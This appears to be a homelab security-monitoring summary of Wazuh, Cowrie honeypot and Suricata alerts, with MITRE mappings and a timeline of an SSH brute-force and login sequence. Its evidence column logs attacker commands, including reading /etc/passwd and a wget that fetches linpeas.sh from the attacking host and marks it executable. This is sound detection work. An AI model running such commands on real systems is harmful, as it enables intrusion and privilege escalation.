# Mini-SOC Triggered Alerts & Threat Telemetry Summary

## 1. Triggered Custom Rules Summary

| Wazuh Rule ID | Source Sensor | Severity | MITRE ATT&CK | Event Count |
|---|---|---|---|---|
| `100501 / 100502` | Cowrie | **HIGH** | `T1110.001` | 6 |
| `100503` | Cowrie | **HIGH** | `T1021.004` | 1 |
| `100504` | Cowrie | **CRITICAL** | `T1059.004` | 2 |
| `100505` | Suricata | **HIGH** | `T1046` | 3 |

## 2. Top Attacking Source IPs

| Rank | Source IP | Total Malicious Events |
|---|---|---|
| 1 | `172.16.167.131` | 11 |
| 2 | `185.220.101.45` | 1 |
| 3 | `172.28.0.20` | 1 |

## 3. Detailed Alert Timeline

| Timestamp | Sensor | Rule ID | Severity | MITRE | Source IP | Evidence / Payload |
|---|---|---|---|---|---|---|
| `2026-11-21T17:10:02.115Z` | Cowrie | `100501 / 100502` | **HIGH** | `T1110.001` | `172.16.167.131` | SSH Brute Force (Password Guessing): `user=root password=wrongpass1` |
| `2026-11-21T17:10:03.220Z` | Cowrie | `100501 / 100502` | **HIGH** | `T1110.001` | `172.16.167.131` | SSH Brute Force (Password Guessing): `user=root password=wrongpass2` |
| `2026-11-21T17:10:04.318Z` | Cowrie | `100501 / 100502` | **HIGH** | `T1110.001` | `172.16.167.131` | SSH Brute Force (Password Guessing): `user=root password=wrongpass3` |
| `2026-11-21T17:10:05.412Z` | Cowrie | `100501 / 100502` | **HIGH** | `T1110.001` | `172.16.167.131` | SSH Brute Force (Password Guessing): `user=root password=wrongpass4` |
| `2026-11-21T17:10:06.519Z` | Cowrie | `100501 / 100502` | **HIGH** | `T1110.001` | `172.16.167.131` | SSH Brute Force (Password Guessing): `user=root password=wrongpass5` |
| `2026-11-21T17:10:08.104Z` | Cowrie | `100503` | **HIGH** | `T1021.004` | `172.16.167.131` | Valid Account / Honeypot SSH Login: `user=root password=123456` |
| `2026-11-21T17:10:10.440Z` | Cowrie | `100504` | **CRITICAL** | `T1059.004` | `172.16.167.131` | Post-Login Unix Shell Command Execution: `uname -a && id && cat /etc/passwd` |
| `2026-11-21T17:10:14.902Z` | Cowrie | `100504` | **CRITICAL** | `T1059.004` | `172.16.167.131` | Post-Login Unix Shell Command Execution: `wget http://172.16.167.131:8000/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh` |
| `2026-11-21T17:10:20.005Z` | Cowrie | `100501 / 100502` | **HIGH** | `T1110.001` | `185.220.101.45` | SSH Brute Force (Password Guessing): `user=admin password=admin123` |
| `2026-11-21T17:09:58.412000+0000` | Suricata | `100505` | **HIGH** | `T1046` | `172.16.167.131` | `ET SCAN Potential SSH Scan` -> `172.28.0.20:2222` |
| `2026-11-21T17:10:06.801000+0000` | Suricata | `100505` | **HIGH** | `T1046` | `172.16.167.131` | `ET SCAN LibSSH Based Frequent SSH Connections Likely BruteForce Attack` -> `172.28.0.20:2222` |
| `2026-11-21T17:10:14.950000+0000` | Suricata | `100505` | **HIGH** | `T1046` | `172.28.0.20` | `ET POLICY GNU/Linux Wget User-Agent Outbound` -> `172.16.167.131:8000` |
